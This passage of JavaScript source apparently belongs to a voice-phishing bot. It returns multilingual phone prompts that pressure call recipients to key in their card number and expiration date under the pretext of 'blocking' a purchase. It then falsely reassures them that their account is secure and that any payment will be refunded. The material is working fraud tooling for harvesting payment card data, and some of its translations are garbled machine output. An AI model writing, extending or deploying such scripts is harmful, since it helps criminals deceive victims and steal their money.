            'en-GB': `GREAT, you have entered ${dtmf}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
            'en-NZ': `GREAT, you have entered ${dtmf}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
            'en-ZA': `GREAT, you have entered ${dtmf}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
            'es-ES': `EXCELENTE, ha ingresado ${dtmf}. Su cuenta ahora es segura. Si el pago ya salió de tu cuenta, NO TE PREOCUPES. Se le reembolsará automáticamente en 24 a 48 horas. Gracias adios.`,
            'pt-PT': `ÓTIMO, você digitou ${dtmf}. Sua conta agora está segura. Se o pagamento já saiu da sua conta, NÃO PRECISA SE PREOCUPAR. Ele será reembolsado automaticamente em 24 a 48 horas. Obrigado, adeus.`,
            'pt-BR': `ÓTIMO, você digitou ${dtmf}. Sua conta agora está segura. Se o pagamento já saiu da sua conta, NÃO PRECISA SE PREOCUPAR. Ele será reembolsado automaticamente em 24 a 48 horas. Obrigado, adeus.`,
            'it-IT': `GRANDE, hai inserito ${dtmf}. Il tuo account è ora sicuro. Se il pagamento ha già lasciato il tuo account, NESSUN BISOGNO DI PREOCCUPARE. Ti verrà automaticamente rimborsato in 24-48 ore. Grazie arrivederci.`,
            'fr-FR': `SUPER, vous avez entré ${dtmf}. Votre compte est maintenant sécurisé. Si le paiement a déjà quitté votre compte, PAS BESOIN DE VOUS INQUIÉTER. Il vous sera automatiquement remboursé sous 24 à 48 heures. Merci, au revoir.`,
            'de-DE': `GROSSARTIG, Sie haben ${dtmf} eingegeben. Ihr Konto ist jetzt sicher. Wenn die Zahlung bereits von Ihrem Konto abgebucht wurde, brauchen Sie sich keine Sorgen zu machen. Es wird Ihnen innerhalb von 24 bis 48 Stunden automatisch zurückerstattet. Danke. Auf Wiedersehen.`,
            'nb-NO': `FLOTT, du har skrevet inn ${dtmf}. Kontoen din er nå sikker. Hvis betalingen allerede har forlatt kontoen din, BEHOV INGEN BEKYMELSE. Den vil automatisk bli refundert til deg innen 24 til 48 timer. Tusen takk, hade.`,
            'pl-PL': `ŚWIETNIE, wpisałeś ${dtmf}. Twoje konto jest teraz bezpieczne. Jeśli wpłata opuściła już Twoje konto, NIE MUSISZ SIĘ TEŻ TEŻ. Zostanie on automatycznie zwrócony w ciągu 24 do 48 godzin. Dziękuję do widzenia.`,
            'sv-SE': `BRA, du har angett ${dtmf}. Ditt konto är nu säkert. Om betalningen redan har lämnat ditt konto, BEHÖVER INGEN BEHÖRIG OROR. Den kommer automatiskt att återbetalas till dig inom 24 till 48 timmar. Tack adjö.`,
            'tr-TR': `BÜYÜK, ${dtmf} girdiniz. Hesabınız artık güvende. Ödeme zaten hesabınızdan çıktıysa, ENDİŞEYE GEREK YOKTUR. 24 ila 48 saat içinde size otomatik olarak iade edilecektir. Teşekkürler hoşça kalın.`,
            'cy-GB': `GWYCH, rydych wedi nodi ${dtmf}. Mae eich cyfrif bellach yn ddiogel. Os yw'r taliad eisoes wedi gadael eich cyfrif, DIM ANGEN PRYNU. Bydd yn cael ei ad-dalu'n awtomatig i chi mewn 24 i 48 awr. Diolch, hwyl fawr.`,
            'nl-NL': `GEWELDIG, je hebt ${dtmf} ingevoerd. Je account is nu beveiligd. Als de betaling uw rekening al heeft verlaten, hoeft u zich geen zorgen te maken. Het wordt automatisch binnen 24 tot 48 uur aan u terugbetaald. Dank u vaarwel.`,
            'da-DK': `FANTASTISK, du har indtastet ${dtmf}. Din konto er nu sikker. Hvis betalingen allerede har forladt din konto, SKAL DU INGEN BETYVELSE. Det vil automatisk blive refunderet til dig inden for 24 til 48 timer. Tak farvel.`,
            'ca-ES': `GENIAL, has introduït ${dtmf}. Ara el teu compte està segur. Si el pagament ja ha sortit del vostre compte, NO HEU DE PREOCUPAR-SE. Se us retornarà automàticament en 24 a 48 hores. Gràcies adéu.`,
          }[language];

        default:
          return `Should never be here.`;
      }

    case `card`:
      switch (sp) {
        case `1`:
          return {
            'en-US': `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
            'en-CA': `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
            'en-AU': `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
            'en-GB': `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
            'en-NZ': `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
            'en-ZA': `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the hash key.`,
            'es-ES': `No has ingresado nada. Por su SEGURIDAD y para BLOQUEAR esta compra, ingrese su número de tarjeta de ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DÉBITO`
                : `CRÉDITO`
            } seguido de la tecla numeral.`,
            'pt-PT': `Você não digitou nada. Para sua SEGURANÇA e para BLOQUEAR esta compra, digite o número do seu cartão de ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DÉBITO`
                : `CRÉDITO`
            } seguido da chave sustenido.`,
            'pt-BR': `Você não digitou nada. Para sua SEGURANÇA e para BLOQUEAR esta compra, digite o número do seu cartão de ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DÉBITO`
                : `CRÉDITO`
            } seguido da chave sustenido.`,
            'it-IT': `Non hai inserito nulla. Per la tua SICUREZZA e per BLOCCARE questo acquisto, inserisci il numero della tua carta di ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBITO`
                : `CREDITO`
            } seguito dal cancelletto.`,
            'fr-FR': `Vous n'avez rien saisi. Pour votre SÉCURITÉ et pour BLOQUER cet achat, veuillez entrer votre numéro de carte ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT`
                : `CRÉDIT`
            } suivi de la touche dièse.`,
            'de-DE': `Sie haben nichts eingegeben. Bitte geben Sie zu Ihrer SICHERHEIT und um diesen Kauf zu BLOCKIEREN Ihre ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT-`
                : `KREDIT`
            }Kartennummer gefolgt von der Raute-Taste ein.`,
            'nb-NO': `Du har ikke skrevet inn noe. For din SIKKERHET og for å BLOKKERE dette kjøpet, skriv inn ${
              cardType && cardType.toLowerCase() === `debit`
                ? `debet`
                : `kreditt`
            }kortnummeret etterfulgt av pund-tasten.`,
            'pl-PL': `Nic nie wpisałeś. Aby uzyskać BEZPIECZEŃSTWO i ZABLOKOWAĆ ten zakup, wprowadź numer karty ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT`
                : `KREDYT`
            }, a następnie krzyżyk.`,
            'sv-SE': `Du har inte angett något. För din SÄKERHET och för att BLOCKERA detta köp, vänligen ange ditt ${
              cardType && cardType.toLowerCase() === `debit`
                ? `betal`
                : `KREDIT`
            }kortsnummer följt av pundnyckeln.`,
            'tr-TR': `Hiçbir şey girmediniz. GÜVENLİĞİNİZ için ve bu satın alma işlemini ENGELLEMEK için lütfen ${
              cardType && cardType.toLowerCase() === `debit` ? `BANKA` : `KREDİ`
            } kartı numaranızı ve ardından kare anahtarını girin.`,
            'cy-GB': `Nid ydych wedi nodi unrhyw beth. Ar gyfer eich DIOGELWCH ac i flocio'r pryniant hwn, rhowch rif eich cerdyn ${
              cardType && cardType.toLowerCase() === `debit`
                ? `debyd`
                : `CREDYD`
            } ac yna'r allwedd punt.`,
            'nl-NL': `U heeft niets ingevuld. Voor uw VEILIGHEID en om deze aankoop te BLOKKEREN, voert u uw ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT-`
                : `CREDIT-`
            }kaartnummer in, gevolgd door het hekje.`,
            'da-DK': `Du har ikke indtastet noget. For din SIKKERHED og for at BLOKERE dette køb skal du indtaste dit ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT-`
                : `KREDIT`
            }kortnummer efterfulgt af pund-tasten.`,
            'ca-ES': `No has introduït res. Per a la vostra SEGURETAT i per BLOQUEAR aquesta compra, introduïu el número de la vostra targeta de ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DÈBIT`
                : `CRÈDIT`
            } seguit de la clau de lliura.`,
          }[language];

        case `2`:
          return {
            'en-US': `The card number you have entered is incorrect. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
            'en-CA': `The card number you have entered is incorrect. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
            'en-AU': `The card number you have entered is incorrect. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
            'en-GB': `The card number you have entered is incorrect. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
            'en-NZ': `The card number you have entered is incorrect. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
            'en-ZA': `The card number you have entered is incorrect. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the hash key.`,
            'es-ES': `El número de tarjeta que ha introducido es incorrecto. Por su SEGURIDAD y para BLOQUEAR esta compra, ingrese su número de tarjeta de ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DÉBITO`
                : `CRÉDITO`
            } seguido de la tecla numeral.`,
            'pt-PT': `O número do cartão que você digitou está incorreto. Para sua SEGURANÇA e para BLOQUEAR esta compra, digite o número do seu cartão de ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DÉBITO`
                : `CRÉDITO`
            } seguido da chave sustenido.`,
            'pt-BR': `O número do cartão que você digitou está incorreto. Para sua SEGURANÇA e para BLOQUEAR esta compra, digite o número do seu cartão de ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DÉBITO`
                : `CRÉDITO`
            } seguido da chave sustenido.`,
            'it-IT': `Il numero della carta che hai inserito non è corretto. Per la tua SICUREZZA e per BLOCCARE questo acquisto, inserisci il numero della tua carta di ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBITO`
                : `CREDITO`
            } seguito dal cancelletto.`,
            'fr-FR': `Le numéro de carte que vous avez entré est incorrect. Pour votre SÉCURITÉ et pour BLOQUER cet achat, veuillez entrer votre numéro de carte ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT`
                : `CRÉDIT`
            } suivi de la touche dièse.`,
            'de-DE': `Die eingegebene Kartennummer ist falsch. Bitte geben Sie zu Ihrer SICHERHEIT und um diesen Kauf zu BLOCKIEREN Ihre ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT-`
                : `KREDIT`
            }Kartennummer gefolgt von der Raute-Taste ein.`,
            'nb-NO': `Kortnummeret du har oppgitt er feil. For din SIKKERHET og for å BLOKKERE dette kjøpet, skriv inn ${
              cardType && cardType.toLowerCase() === `debit`
                ? `debet`
                : `kreditt`
            }kortnummeret etterfulgt av pund-tasten.`,
            'pl-PL': `Wprowadzony numer karty jest nieprawidłowy. Aby uzyskać BEZPIECZEŃSTWO i ZABLOKOWAĆ ten zakup, wprowadź numer karty ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT`
                : `KREDYT`
            }, a następnie krzyżyk.`,
            'sv-SE': `Kortnumret du har angett är felaktigt. För din SÄKERHET och för att BLOCKERA detta köp, vänligen ange ditt ${
              cardType && cardType.toLowerCase() === `debit`
                ? `betal`
                : `KREDIT`
            }kortsnummer följt av pundnyckeln.`,
            'tr-TR': `Girdiğiniz kart numarası yanlış. GÜVENLİĞİNİZ için ve bu satın alma işlemini ENGELLEMEK için lütfen ${
              cardType && cardType.toLowerCase() === `debit` ? `BANKA` : `KREDİ`
            } kartı numaranızı ve ardından kare anahtarını girin.`,
            'cy-GB': `Mae rhif y cerdyn rydych chi wedi'i nodi yn anghywir. Ar gyfer eich DIOGELWCH ac i flocio'r pryniant hwn, rhowch rif eich cerdyn ${
              cardType && cardType.toLowerCase() === `debit`
                ? `debyd`
                : `CREDYD`
            } ac yna'r allwedd punt.`,
            'nl-NL': `Het door u ingevoerde kaartnummer is onjuist. Voor uw VEILIGHEID en om deze aankoop te BLOKKEREN, voert u uw ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT-`
                : `CREDIT-`
            }kaartnummer in, gevolgd door het hekje.`,
            'da-DK': `Kortnummeret du har indtastet er forkert. For din SIKKERHED og for at BLOKERE dette køb skal du indtaste dit ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT-`
                : `KREDIT`
            }kortnummer efterfulgt af pund-tasten.`,
            'ca-ES': `El número de targeta que heu introduït és incorrecte. Per a la vostra SEGURETAT i per BLOQUEAR aquesta compra, introduïu el número de la vostra targeta de ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DÈBIT`
                : `CRÈDIT`
            } seguit de la clau de lliura.`,
          }[language];

        case `3`:
          return {
            'en-US': `GREAT, you have entered ${dtmf}. Please enter your ${cardType} card expiration date followed by the pound key.`,
            'en-CA': `GREAT, you have entered ${dtmf}. Please enter your ${cardType} card expiration date followed by the pound key.`,
            'en-AU': `GREAT, you have entered ${dtmf}. Please enter your ${cardType} card expiration date followed by the pound key.`,
            'en-GB': `GREAT, you have entered ${dtmf}. Please enter your ${cardType} card expiration date followed by the pound key.`,
            'en-NZ': `GREAT, you have entered ${dtmf}. Please enter your ${cardType} card expiration date followed by the pound key.`,
            'en-ZA': `GREAT, you have entered ${dtmf}. Please enter your ${cardType} card expiration date followed by the hash key.`,
            'es-ES': `EXCELENTE, ingresó ${dtmf}. Ingrese la fecha de vencimiento de su tarjeta de ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DÉBITO`
                : `CRÉDITO`
            } seguida de la tecla numeral.`,
            'pt-PT': `ÓTIMO, você digitou ${dtmf}. Por favor, digite a data de validade do seu cartão de ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DÉBITO`
                : `CRÉDITO`
            } seguida da chave sustenido.`,
            'pt-BR': `ÓTIMO, você digitou ${dtmf}. Por favor, digite a data de validade do seu cartão de ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DÉBITO`
                : `CRÉDITO`
            } seguida da chave sustenido.`,
            'it-IT': `GRANDE, hai inserito ${dtmf}. Inserisci la data di scadenza della tua carta di ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBITO`
                : `CREDITO`
            } seguita dal cancelletto.`,
            'fr-FR': `SUPER, vous avez entré ${dtmf}. Veuillez entrer la date d'expiration de votre carte ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT`
                : `CRÉDIT`
            } suivie de la touche dièse.`,
            'de-DE': `GROSSARTIG, Sie haben ${dtmf} eingegeben. Bitte geben Sie das Ablaufdatum Ihrer ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT-`
                : `KREDIT`
            }Karte gefolgt von der Raute-Taste ein.`,
            'nb-NO': `FLOTT, du har skrevet inn ${dtmf}. Vennligst skriv inn utløpsdatoen for ${
              cardType && cardType.toLowerCase() === `debit`
                ? `debet`
                : `kreditt`
            }kortet ditt etterfulgt av pundnøkkelen.`,
            'pl-PL': `ŚWIETNIE, wpisałeś ${dtmf}. Wprowadź datę ważności karty ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT`
                : `KREDYT`
            }, a następnie krzyżyk.`,
            'sv-SE': `BRA, du har angett ${dtmf}. Ange ditt ${
              cardType && cardType.toLowerCase() === `debit`
                ? `betal`
                : `KREDIT`
            }korts utgångsdatum följt av pundnyckeln.`,
            'tr-TR': `BÜYÜK, ${dtmf} girdiniz. Lütfen ${
              cardType && cardType.toLowerCase() === `debit` ? `BANKA` : `KREDİ`
            } kartınızın son kullanma tarihini ve ardından kare anahtarını girin.`,
            'cy-GB': `GWYCH, rydych wedi nodi ${dtmf}. Nodwch ddyddiad dod i ben eich cerdyn ${
              cardType && cardType.toLowerCase() === `debit`
                ? `debyd`
                : `CREDYD`
            } ac yna'r allwedd punt.`,
            'nl-NL': `GEWELDIG, u heeft ${dtmf} ingevoerd. Voer de vervaldatum van uw ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT-`
                : `CREDIT-`
            }kaart in, gevolgd door het hekje.`,
            'da-DK': `FANTASTISK, du har indtastet ${dtmf}. Indtast venligst dit ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT-`
                : `KREDIT`
            }korts udløbsdato efterfulgt af pund-tasten.`,
            'ca-ES': `GENIAL, heu introduït ${dtmf}. Introduïu la data de caducitat de la vostra targeta de ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DÈBIT`
                : `CRÈDIT`
            } seguida de la clau.`,
          }[language];
        default:
          return `Should never be here.`;
      }
    default:
      break;
  }
};
